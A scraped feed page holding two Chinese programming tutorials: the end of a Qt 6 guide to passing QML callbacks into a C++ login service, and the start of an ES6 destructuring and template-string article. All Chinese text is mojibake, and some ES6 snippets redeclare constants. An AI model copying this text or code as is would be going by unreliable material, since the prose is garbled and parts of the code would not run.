<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// main.cpp</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QGuiApplication&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QQmlApplicationEngine&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"authentication_service.h"</span></span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> </span>{
    <span class="hljs-function">QGuiApplication <span class="hljs-title">app</span><span class="hljs-params">(argc, argv)</span></span>;

    QQmlApplicationEngine engine;

    <span class="hljs-comment">// æ³¨å†Œ C++ å•ä¾‹åˆ° QMLï¼ˆæ¨¡å—åï¼šbackendï¼Œç‰ˆæœ¬ï¼š1.0ï¼Œå¯¹è±¡åï¼šAuthenticationServiceï¼‰</span>
    <span class="hljs-built_in">qmlRegisterSingletonInstance</span>(
        <span class="hljs-string">"backend"</span>,                <span class="hljs-comment">// QML å¯¼å…¥æ—¶çš„æ¨¡å—å</span>
        <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,                     <span class="hljs-comment">// ç‰ˆæœ¬å·ï¼ˆéœ€ä¸ QML import ä¸€è‡´ï¼‰</span>
        <span class="hljs-string">"AuthenticationService"</span>,  <span class="hljs-comment">// QML ä¸­è®¿é—®çš„å¯¹è±¡å</span>
        AuthenticationService::<span class="hljs-built_in">instance</span>() <span class="hljs-comment">// å•ä¾‹å®ä¾‹</span>
    );

    <span class="hljs-comment">// åŠ è½½ QML ä¸»æ–‡ä»¶</span>
    <span class="hljs-function"><span class="hljs-type">const</span> QUrl <span class="hljs-title">url</span><span class="hljs-params">(<span class="hljs-string">u"qrc:/LoginDemo/main.qml"</span>_qs)</span></span>;
    QObject::<span class="hljs-built_in">connect</span>(&amp;engine, &amp;QQmlApplicationEngine::objectCreationFailed,
        &amp;app, []() { QCoreApplication::<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); },
        Qt::QueuedConnection);
    engine.<span class="hljs-built_in">load</span>(url);

    <span class="hljs-keyword">return</span> app.<span class="hljs-built_in">exec</span>();
}
</code></pre>
<p><strong>å…³é”®æ³¨æ„ï¼š</strong></p>
<ul>
<li>æ³¨å†Œæ—¶æ¨¡å—åï¼ˆ<code>backend</code>ï¼‰ã€ç‰ˆæœ¬å·ï¼ˆ<code>1.0</code>ï¼‰å¿…é¡»ä¸ QML ä¸­çš„ <code>import</code> è¯­å¥ä¸€è‡´ï¼›</li>
<li>å•ä¾‹æ³¨å†Œéœ€ç”¨ <code>qmlRegisterSingletonInstance</code>ï¼ˆQt 5.15+ æ”¯æŒï¼ŒQt 6 æ¨èï¼‰ï¼Œè€Œé <code>qmlRegisterSingletonType</code>ï¼ˆåè€…é€‚åˆåŠ¨æ€åˆ›å»ºå•ä¾‹ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-6">å››ã€Step 3ï¼šQML ä¸­è°ƒç”¨ C++ æ–¹æ³•å¹¶å¤„ç†å›è°ƒ</h3>
<p>åœ¨ QML ç•Œé¢ä¸­ï¼Œå¯¼å…¥æ³¨å†Œçš„æ¨¡å—ï¼Œè°ƒç”¨ <code>AuthenticationService.login</code> å¹¶ä¼ å…¥å›è°ƒå‡½æ•°ï¼š</p>
<pre><code class="hljs language-qml" lang="qml">// main.qml
import QtQuick 6.2
import QtQuick.Controls 6.2
import backend 1.0 // å¯¼å…¥ C++ æ³¨å†Œçš„æ¨¡å—ï¼ˆéœ€ä¸æ³¨å†Œæ—¶çš„æ¨¡å—åã€ç‰ˆæœ¬ä¸€è‡´ï¼‰

ApplicationWindow {
    width: 400
    height: 300
    title: "ç™»å½•æ¼”ç¤º"
    visible: true

    ColumnLayout {
        anchors.centerIn: parent
        spacing: 16

        TextField {
            id: usernameField
            placeholderText: "è¾“å…¥ç”¨æˆ·å"
            Layout.width: 250
            text: "admin" // æµ‹è¯•ç”¨é»˜è®¤å€¼
        }

        TextField {
            id: passwordField
            placeholderText: "è¾“å…¥å¯†ç "
            echoMode: TextField.Password
            Layout.width: 250
            text: "123456" // æµ‹è¯•ç”¨é»˜è®¤å€¼ï¼ˆæ­£ç¡®å¯†ç ï¼‰
            // text: "wrong" // æµ‹è¯•å¤±è´¥åœºæ™¯
        }

        Button {
            text: "ç™»å½•"
            Layout.width: 250
            onClicked: {
                // è°ƒç”¨ C++ çš„ login æ–¹æ³•ï¼Œä¼ å…¥å›è°ƒå‡½æ•°
                AuthenticationService.login(
                    usernameField.text,
                    passwordField.text,
                    // æˆåŠŸå›è°ƒï¼šæ¥æ”¶ C++ ä¼ é€’çš„å“åº”æ•°æ®
                    function(response) {
                        console.log("ç™»å½•æˆåŠŸï¼å“åº”ï¼š", JSON.stringify(response))
                        // è®¿é—®å“åº”å±æ€§ï¼ˆC++ ä¸­ LoginResponse çš„å­—æ®µï¼‰
                        console.log("Token:", response.token)
                        console.log("ç”¨æˆ·å:", response.username)
                    },
                    // å¤±è´¥å›è°ƒï¼šæ¥æ”¶ C++ ä¼ é€’çš„é”™è¯¯ä¿¡æ¯
                    function(error) {
                        console.log("ç™»å½•å¤±è´¥ï¼é”™è¯¯ç ï¼š", error.code, " ä¿¡æ¯ï¼š", error.message)
                        // åœ¨ç•Œé¢æ˜¾ç¤ºé”™è¯¯æç¤º
                        errorLabel.text = error.message
                    }
                )
            }
        }

        Label {
            id: errorLabel
            color: "red"
            Layout.width: 250
            horizontalAlignment: Text.AlignCenter
        }
    }
}
</code></pre>
<h3 data-id="heading-7">äº”ã€æ ¸å¿ƒæŠ€æœ¯å…³é”®ç‚¹è§£æ</h3>
<h4 data-id="heading-8">1. QJSValueï¼šC++ ä¸ QML å›è°ƒçš„æ¡¥æ¢</h4>
<ul>
<li><code>QJSValue</code> æ˜¯ Qt ä¸­å°è£… JavaScript å€¼çš„ç±»ï¼Œæ”¯æŒå­˜å‚¨å‡½æ•°ã€å¯¹è±¡ã€åŸºæœ¬ç±»å‹ç­‰ï¼›</li>
<li>ç”¨ <code>isCallable()</code> æ£€æŸ¥æ˜¯å¦ä¸ºå¯è°ƒç”¨çš„ JavaScript å‡½æ•°ï¼ˆå›è°ƒï¼‰ï¼›</li>
<li>ç”¨ <code>call(QJSValueList args)</code> è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå‚æ•°é€šè¿‡ <code>QJSValueList</code> ä¼ é€’ã€‚</li>
</ul>
<h4 data-id="heading-9">2. çº¿ç¨‹å®‰å…¨ï¼ˆé‡ä¸­ä¹‹é‡ï¼‰</h4>
<ul>
<li>QML çš„ <code>QJSEngine</code> æ˜¯<strong>çº¿ç¨‹å…³è”</strong>çš„ï¼ˆé»˜è®¤ç»‘å®šä¸»çº¿ç¨‹ï¼‰ï¼Œç›´æ¥åœ¨åå°çº¿ç¨‹è°ƒç”¨ <code>QJSValue::call</code> ä¼šå¯¼è‡´å´©æºƒï¼›</li>
<li>è§£å†³æ–¹æ¡ˆï¼šç”¨ <code>QMetaObject::invokeMethod</code> + <code>Qt::QueuedConnection</code>ï¼Œå°†å›è°ƒè°ƒç”¨åˆ‡æ¢åˆ°ä¸»çº¿ç¨‹æ‰§è¡Œã€‚</li>
</ul>
<h4 data-id="heading-10">3. è‡ªå®šä¹‰æ•°æ®ç±»å‹è½¬ QJSValue</h4>
<ul>
<li>è‡ªå®šä¹‰ç±»ï¼ˆå¦‚ <code>KratosError</code>ã€<code>LoginResponse</code>ï¼‰éœ€æä¾› toQJSValue æ–¹æ³•ï¼Œé€šè¿‡ <code>QJSEngine::newObject()</code> åˆ›å»º JS å¯¹è±¡ï¼Œå†ç”¨ <code>setProperty</code> è®¾ç½®å±æ€§ï¼›</li>
<li>QML ä¸­å¯ç›´æ¥é€šè¿‡å±æ€§åè®¿é—®ï¼ˆå¦‚ <code>error.message</code>ã€<code>response.token</code>ï¼‰ï¼Œå¤§å°å†™æ•æ„Ÿã€‚</li>
</ul>
<h4 data-id="heading-11">4. æœ‰æ•ˆæ€§æ£€æŸ¥</h4>
<ul>
<li>å¿…é¡»æ£€æŸ¥ <code>QJSEngine* engine = qjsEngine(this)</code> æ˜¯å¦ä¸ºç©ºï¼ˆé¿å… QML ç»„ä»¶é”€æ¯åå¼•æ“å¤±æ•ˆï¼‰ï¼›</li>
<li>å¿…é¡»æ£€æŸ¥å›è°ƒå‡½æ•° <code>isCallable()</code>ï¼ˆé¿å…ä¼ å…¥éå‡½æ•°ç±»å‹å¯¼è‡´å´©æºƒï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-12">å…­ã€å¸¸è§é—®é¢˜æ’æŸ¥</h3>
<h4 data-id="heading-13">1. QML æ— æ³•å¯¼å…¥ backend æ¨¡å—ï¼Ÿ</h4>
<ul>
<li>æ£€æŸ¥ <code>qmlRegisterSingletonInstance</code> çš„æ¨¡å—åã€ç‰ˆæœ¬å·ä¸ QML import ä¸€è‡´ï¼›</li>
<li>ç¡®ä¿ C++ ç±»ç»§æ‰¿ <code>QObject</code> å¹¶æ·»åŠ  <code>Q_OBJECT</code> å®ï¼›</li>
<li>æ„å»ºæ—¶ç¡®ä¿ MOC æ–‡ä»¶æ­£å¸¸ç”Ÿæˆï¼ˆqmake è‡ªåŠ¨å¤„ç†ï¼ŒCMake éœ€æ·»åŠ  <code>qt_add_qml_module</code>ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-14">2. å›è°ƒå‡½æ•°ä¸æ‰§è¡Œï¼Ÿ</h4>
<ul>
<li>æ£€æŸ¥ <code>isCallable()</code> æ˜¯å¦è¿”å› <code>true</code>ï¼ˆç¡®è®¤ä¼ å…¥çš„æ˜¯å‡½æ•°ï¼‰ï¼›</li>
<li>æ£€æŸ¥æ˜¯å¦åœ¨ä¸»çº¿ç¨‹è°ƒç”¨ <code>call()</code>ï¼ˆåå°çº¿ç¨‹è°ƒç”¨ä¼šé™é»˜å¤±è´¥ï¼‰ï¼›</li>
<li>æ£€æŸ¥å¼‚æ­¥é€»è¾‘æ˜¯å¦æ­£å¸¸æ‰§è¡Œï¼ˆå¦‚æ¨¡æ‹Ÿçš„ <code>QThread::sleep</code> åæ˜¯å¦è§¦å‘å›è°ƒï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-15">3. ç¨‹åºå´©æºƒï¼Ÿ</h4>
<ul>
<li>å¤§æ¦‚ç‡æ˜¯çº¿ç¨‹é—®é¢˜ï¼šåå°çº¿ç¨‹ç›´æ¥æ“ä½œ <code>QJSValue</code> æˆ– <code>QJSEngine</code>ï¼›</li>
<li>æ£€æŸ¥ <code>engine</code> æ˜¯å¦ä¸ºç©ºï¼ˆå¦‚å•ä¾‹é”€æ¯åä»è°ƒç”¨å›è°ƒï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-16">ä¸ƒã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-17">1. ä¼˜å…ˆä½¿ç”¨å›è°ƒè¿˜æ˜¯ä¿¡å·æ§½ï¼Ÿ</h4>
<ul>
<li><strong>å›è°ƒ</strong>ï¼šé€‚åˆä¸€æ¬¡æ€§æ“ä½œï¼ˆå¦‚ç™»å½•ã€å•æ¬¡ç½‘ç»œè¯·æ±‚ï¼‰ï¼Œä»£ç ç›´è§‚ï¼Œå‚æ•°ä¼ é€’çµæ´»ï¼›</li>
<li><strong>ä¿¡å·æ§½</strong>ï¼šé€‚åˆå¤šæ¬¡é€šçŸ¥ï¼ˆå¦‚å®æ—¶æ•°æ®æ›´æ–°ï¼‰ï¼Œè§£è€¦æ€§æ›´å¼ºï¼Œæ”¯æŒå¤šè®¢é˜…è€…ï¼›</li>
<li>æœ¬æ–‡åœºæ™¯ï¼ˆç™»å½•ï¼‰ç”¨å›è°ƒæ›´åˆé€‚ï¼Œç®€æ´é«˜æ•ˆã€‚</li>
</ul>
<h4 data-id="heading-18">2. ç®€åŒ–æ•°æ®ä¼ é€’ï¼ˆå¯é€‰ï¼‰</h4>
<p>è‹¥æ•°æ®ç®€å•ï¼Œå¯ç›´æ¥ç”¨ <code>QVariantMap</code> ä»£æ›¿è‡ªå®šä¹‰ç±»ï¼Œæ— éœ€å†™ <code>toQJSValue</code> æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp">QVariantMap errorMap;
errorMap[<span class="hljs-string">"code"</span>] = <span class="hljs-number">401</span>;
errorMap[<span class="hljs-string">"message"</span>] = <span class="hljs-string">"ç™»å½•å¤±è´¥"</span>;
onFailure.<span class="hljs-built_in">call</span>(QJSValueList{engine-&gt;<span class="hljs-built_in">toScriptValue</span>(errorMap)});
</code></pre>
<h4 data-id="heading-19">3. é¿å…å›è°ƒåœ°ç‹±</h4>
<p>è‹¥å­˜åœ¨å¤šå±‚å›è°ƒï¼ˆå¦‚ç™»å½•åè°ƒç”¨è·å–ç”¨æˆ·ä¿¡æ¯ï¼‰ï¼Œå¯è€ƒè™‘ç”¨ Qt 6 çš„ <code>QPromise</code> + <code>co_await</code>ï¼ˆC++20+ï¼‰æˆ– QML çš„ <code>async/await</code> ä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-20">å…«ã€æ€»ç»“</h3>
<p>æœ¬æ–‡å®Œæ•´å®ç°äº† Qt 6 ä¸­ C++ è°ƒç”¨ QML å›è°ƒçš„æµç¨‹ï¼Œæ ¸å¿ƒæ˜¯ï¼š</p>
<ol>
<li>C++ ç±»ç»§æ‰¿ <code>QObject</code> å¹¶æš´éœ² <code>Q_INVOKABLE</code> æ–¹æ³•ï¼›</li>
<li>ç”¨ <code>QJSValue</code> æ¥æ”¶ QML å›è°ƒï¼Œç”¨ <code>call()</code> è§¦å‘å›è°ƒï¼›</li>
<li>å¼‚æ­¥åœºæ™¯ä¸‹å¿…é¡»åˆ‡æ¢åˆ°ä¸»çº¿ç¨‹æ‰§è¡Œå›è°ƒï¼Œç¡®ä¿çº¿ç¨‹å®‰å…¨ï¼›</li>
<li>è‡ªå®šä¹‰æ•°æ®é€šè¿‡ <code>QJSValue</code> è½¬æ¢åä¼ é€’ï¼ŒQML å¯ç›´æ¥è®¿é—®å±æ€§ã€‚</li>
</ol>
<p>è¿™ç§æ–¹å¼é€‚ç”¨äºæ‰€æœ‰å¼‚æ­¥é€šä¿¡åœºæ™¯ï¼ˆç™»å½•ã€ç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶è¯»å†™ç­‰ï¼‰ï¼Œæ˜¯ C++ ä¸ QML åä½œçš„æ ¸å¿ƒæŠ€å·§ä¹‹ä¸€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ES6+ æ–°ç‰¹æ€§è§£æï¼šè®© JavaScript å¼€å‘æ›´ä¼˜é›…é«˜æ•ˆ]]></title>    <link>https://juejin.cn/post/7576052677051416602</link>    <guid>https://juejin.cn/post/7576052677051416602</guid>    <pubDate>2025-11-24T10:21:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576052677051416602" data-draft-id="7576070987294031918" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" ES6+ æ–°ç‰¹æ€§è§£æï¼šè®© JavaScript å¼€å‘æ›´ä¼˜é›…é«˜æ•ˆ"/> <meta itemprop="keywords" content="ECMAScript 6,å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T10:21:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="San30"/> <meta itemprop="url" content="https://juejin.cn/user/1766294768060816"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             ES6+ æ–°ç‰¹æ€§è§£æï¼šè®© JavaScript å¼€å‘æ›´ä¼˜é›…é«˜æ•ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1766294768060816/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    San30
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T10:21:35.000Z" title="Mon Nov 24 2025 10:21:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"ã€Œ"}.markdown-body b:after,.markdown-body strong:after{content:"ã€"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p>ES6ï¼ˆECMAScript 2015ï¼‰æ˜¯ JavaScript è¯­è¨€å‘å±•çš„é‡Œç¨‹ç¢‘ï¼Œå¼•å…¥äº†å¤§é‡è®©ä»£ç æ›´ç®€æ´ã€æ›´æ˜“ç»´æŠ¤çš„æ–°ç‰¹æ€§ã€‚æœ¬æ–‡å°†æ·±å…¥è§£æè¿™äº›ç‰¹æ€§ï¼Œå¹¶é€šè¿‡å®é™…ä»£ç ç¤ºä¾‹å±•ç¤ºå®ƒä»¬çš„å¼ºå¤§ä¹‹å¤„ã€‚</p>
<h2 data-id="heading-0">è§£æ„èµ‹å€¼ï¼šä¼˜é›…çš„æ•°æ®æå–</h2>
<p>è§£æ„èµ‹å€¼è®©æˆ‘ä»¬èƒ½å¤Ÿä»æ•°ç»„æˆ–å¯¹è±¡ä¸­å¿«é€Ÿæå–å€¼ï¼Œèµ‹ç»™å˜é‡ã€‚</p>
<h3 data-id="heading-1">æ•°ç»„è§£æ„</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åŸºæœ¬æ•°ç»„è§£æ„</span>
<span class="hljs-keyword">const</span> [a, b, c] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b, c); <span class="hljs-comment">// 1 2 3</span>

<span class="hljs-comment">// åµŒå¥—æ•°ç»„è§£æ„</span>
<span class="hljs-keyword">const</span> [a, [b, c, [d], e]] = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, [<span class="hljs-number">4</span>], <span class="hljs-number">5</span>]];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b, c, d, e); <span class="hljs-comment">// 1 2 3 4 5</span>

<span class="hljs-comment">// å‰©ä½™å‚æ•°è§£æ„</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> [first, ...rest] = arr;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(first, rest); <span class="hljs-comment">// 1 [2, 3, 4, 5]</span>

<span class="hljs-comment">// å®é™…åº”ç”¨ï¼šæå–æ•™ç»ƒå’Œçƒå‘˜</span>
<span class="hljs-keyword">const</span> users = [<span class="hljs-string">'Darvin Ham'</span>, <span class="hljs-string">'James'</span>, <span class="hljs-string">'Luka'</span>, <span class="hljs-string">'Davis'</span>, <span class="hljs-string">'Ayton'</span>, <span class="hljs-string">'Kyle'</span>];
<span class="hljs-keyword">const</span> [captain, ...players] = users;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(captain, players); 
<span class="hljs-comment">// Darvin Ham ['James', 'Luka', 'Davis', 'Ayton', 'Kyle']</span>
</code></pre>
<h3 data-id="heading-2">å¯¹è±¡è§£æ„</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sex = <span class="hljs-string">'boy'</span>;
<span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Darvin Ham'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
    sex, <span class="hljs-comment">// å¯¹è±¡å±æ€§ç®€å†™</span>
    <span class="hljs-attr">like</span>: {
        <span class="hljs-attr">n</span>: <span class="hljs-string">'å”±è·³'</span>
    }
};

<span class="hljs-comment">// å¯¹è±¡è§£æ„</span>
<span class="hljs-keyword">let</span> { name, age, <span class="hljs-attr">like</span>: { n } } = obj;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name, age, n); <span class="hljs-comment">// Darvin Ham 25 å”±è·³</span>

<span class="hljs-comment">// å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥è§£æ„</span>
<span class="hljs-keyword">const</span> [e, r, ...u] = <span class="hljs-string">'hello'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e, r, u); <span class="hljs-comment">// h e ['l', 'l', 'o']</span>

<span class="hljs-comment">// è·å–å­—ç¬¦ä¸²é•¿åº¦</span>
<span class="hljs-keyword">const</span> { length } = <span class="hljs-string">'hello'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(length); <span class="hljs-comment">// 5</span>
</code></pre>
<h3 data-id="heading-3">è§£æ„çš„å®ç”¨æŠ€å·§</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// äº¤æ¢å˜é‡ï¼ˆæ— éœ€ä¸´æ—¶å˜é‡ï¼‰</span>
<span class="hljs-keyword">let</span> x = <span class="hljs-number">1</span>, y = <span class="hljs-number">2</span>;
[x, y] = [y, x];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x, y); <span class="hljs-comment">// 2 1</span>

<span class="hljs-comment">// å‡½æ•°å‚æ•°è§£æ„</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">{ name, greeting = <span class="hljs-string">'Hello'</span> }</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, <span class="hljs-subst">${name}</span>!`</span>);
}
<span class="hljs-title function_">greet</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span> }); <span class="hljs-comment">// Hello, Bob!</span>

<span class="hljs-comment">// è®¾ç½®é»˜è®¤å€¼</span>
<span class="hljs-keyword">const</span> { name, gender = <span class="hljs-string">'unknown'</span> } = { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gender); <span class="hljs-comment">// unknownï¼ˆå› ä¸º user ä¸­æ²¡æœ‰ gender å±æ€§ï¼‰</span>
</code></pre>
<h2 data-id="heading-4">æ¨¡æ¿å­—ç¬¦ä¸²ï¼šæ›´ä¼˜é›…çš„å­—ç¬¦ä¸²å¤„ç†</h2>
<p>æ¨¡æ¿å­—ç¬¦ä¸²ä½¿ç”¨åå¼•å·(``)å®šä¹‰ï¼Œæ”¯æŒå¤šè¡Œå­—ç¬¦ä¸²å’Œæ’å€¼è¡¨è¾¾å¼ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> myName = <span class="hljs-string">'zhangsan'</span>;

<span class="hljs-comment">// ä¼ ç»Ÿå­—ç¬¦ä¸²æ‹¼æ¥</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello, i am '</span> + myName);

